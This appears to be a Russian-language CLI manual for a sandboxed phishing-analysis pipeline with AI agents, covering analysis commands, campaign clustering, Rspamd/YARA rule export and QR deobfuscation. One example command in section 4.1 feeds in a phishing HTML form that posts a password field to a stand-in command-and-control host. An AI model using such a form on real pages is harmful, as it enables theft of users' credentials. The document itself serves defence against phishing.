# Phishing Threat Intelligence Pipeline — Полное руководство пользователя (CLI)

**Threat Intelligence Pipeline** — комплексная система глубокого анализа фишинговых образцов (URL, HTML, вложения, PDF, QR-коды) с накоплением базы знаний, кластеризацией спам-кампаний и экспортом компактных правил для локального антиспама.

Всё исполнение потенциально вредоносного кода происходит в **изолированной Docker-песочнице**, на компьютер пользователя ничего вредоносного не попадает.

---

## 0. Архитектура и контейнеры

Система работает в связке из двух контейнеров в изолированной сети Docker:

| Контейнер | Назначение | Доступ к сети / Права |
|---|---|---|
| **`threat_agents`** | Чистая зона (Brain): оркестратор, ReAct-агенты, SQLite БД, экспорт правил, связь с LLM/VLM через `.env`. | Опасный код **не исполняет**. |
| **`threat_sandbox`** | Грязная зона: Playwright Chromium, парсер документов, декодер QR, OCR. | `read_only: true`, `cap_drop: ALL`, `no-new-privileges: true`, непривилегированный пользователь `pwuser` (UID 1000). Порты наружу не публикуются. |

---

## 1. Быстрый старт

В корне проекта:
```bash
# 1. Запустить контейнеры
docker compose up -d

# 2. Проверить статус (оба должны быть Up)
docker compose ps

# 3. Проверить статистику базы знаний
docker exec threat_agents python main.py stats
```

---

## 2. Структура хранения данных

Оба контейнера делят общий том Docker `data_volume`:
- `/app/data/analysis.db` — единая база SQLite (образцы, URL, артефакты, бренды, findings, сигнатуры, кампании).
- `/app/data/artifacts/` — артефакты образцов (`sample_<id>/`: скриншоты, dom.html, извлеченные документы, распакованные архивы).

---

## 3. Передача файлов для анализа

Файл передается на общий том песочницы из Windows через `docker cp`:
```bash
docker cp "C:\path\to\phishing.html" threat_agents:/app/data/artifacts/sample.html
```

---

## 4. Справочник команд CLI (`main.py`)

Все команды запускаются через `docker exec threat_agents python main.py <команда>`:

### 4.1. Анализ образца (`analyze`)

```bash
docker exec threat_agents python main.py analyze <ЦЕЛЬ> --type <url|file|html> [опции]
```

**Параметры:**
- `<ЦЕЛЬ>` — URL-ссылка, путь к файлу внутри контейнера (`/app/data/artifacts/...`), или строка с HTML-кодом.
- `--type` (обязательный): `url`, `file`, `html`.
- `--json`: вывод финального отчета анализа сразу в виде чистого JSON.

**Примеры:**
```bash
# Анализ фишинговой ссылки через связку Сборщик → Аналитик
docker exec threat_agents python main.py analyze "https://sber-verify-auth.xyz/login" --type url

# Анализ HTML-кода
docker exec threat_agents python main.py analyze "<html><form action='http://c2.evil/drop' method='POST'><input type='password'></form></html>" --type html

# Анализ вложения (PDF, EML, DOCX, ZIP, Картинка с QR)
docker exec threat_agents python main.py analyze /app/data/artifacts/sample.html --type file
```

---

### 4.2. Просмотр отчетов по образцу (`report`)

```bash
# Человекочитаемый отчет (бренд, техники, Reason Codes, сигнатуры)
docker exec threat_agents python main.py report <ID>

# Полный JSON-отчет со всеми метаданными для интеграции
docker exec threat_agents python main.py report <ID> --json
```

---

### 4.3. Просмотр цепочки рассуждений агентов (`trace`)

Показывает полный журнал шагов ReAct-агентов Сборщика и Аналитика (мысли модели, вызовы тулзов, наблюдения, исправления ошибок):

```bash
docker exec threat_agents python main.py trace <ID>
```

---

### 4.4. Отслеживание фишинговых кампаний (`campaigns`)

Кластеризует образцы на основе совпадения целевого бренда и структурного остова DOM (`dom_hash`):

```bash
# Список выявленных кампаний
docker exec threat_agents python main.py campaigns

# Вывод в формате JSON
docker exec threat_agents python main.py campaigns --json
```

---

### 4.5. Экспорт компактных правил для локального антиспама (`export-rules`)

Генерирует готовые правила для загрузки в почтовые шлюзы и легковесные фильтры:

```bash
# Универсальный JSON-Rulepack (правила брендов, DOM-шаблоны, URL-шаблоны, хэши вложений)
docker exec threat_agents python main.py export-rules --format json

# Экспорт в файл внутри volume
docker exec threat_agents python main.py export-rules --format json --out /app/data/rulepack.json

# Нативный конфигурационный файл для Rspamd (Lua со скорингом)
docker exec threat_agents python main.py export-rules --format rspamd

# Правила YARA по хэшам артефактов
docker exec threat_agents python main.py export-rules --format yara
```

---

### 4.6. Общая статистика базы знаний (`stats`)

Показывает количество образцов, URL, артефактов, брендов, находок, сигнатур и кампаний:

```bash
docker exec threat_agents python main.py stats
```

---

## 5. Нормализация и очистка QR-кодов (Quishing Defense)

В песочницу встроен адаптивный многоступенчатый каскад предобработки QR-кодов на базе `Pillow`:
1. **Сырое декодирование** (1 мс) — для чистых QR.
2. **Grayscale + Автоконтраст** — для блеклых или полупрозрачных кодов.
3. **Медианный фильтр 3x3** — устраняет искусственный шум («соль и перец»), битые пиксели и зерно сканирования.
4. **Адаптивная бинаризация Оцу** — преодолевает тени и цветовые градиенты.
5. **Цветовая инверсия** — распознает QR в темной теме (Dark Mode).
6. **Upscaling 2x** — для мелких изображений.

**Детекция обфускации:**  
Если QR распознан только после применения фильтра, система фиксирует попытку скрытного фишинга:
- Finding: `qr_obfuscation` (severity: `high`).
- Reason Codes: `QR_OBFUSCATION_DENOISED_MEDIAN`, `QR_PHISHING`.

---

## 6. Режим стерильного анализа опасных файлов

Для исключения перекрестного загрязнения между опасными образцами:
```bash
# На хосте (Git Bash / WSL):
bash scripts/analyze_clean.sh /app/data/artifacts/malware.html --type file
```
Контейнер песочницы пересоздается с чистого листа перед запуском анализа.
